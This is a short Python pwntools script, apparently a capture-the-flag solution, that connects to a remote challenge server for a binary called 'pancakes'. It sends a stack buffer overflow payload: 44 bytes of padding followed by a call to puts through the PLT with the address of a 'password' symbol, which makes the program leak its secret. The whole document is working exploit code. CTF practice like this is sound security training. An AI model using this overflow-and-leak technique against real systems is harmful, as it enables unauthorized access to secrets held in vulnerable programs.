from pwn import *


e = ELF('pancakes')

# p = process('pancakes')
p = remote('chal.tuctf.com', 30503)

p.sendlineafter('> ', 'A' * 44 + p32(e.plt['puts']) + 'AAAA' + p32(e.symbols['password']))
print p.recvall()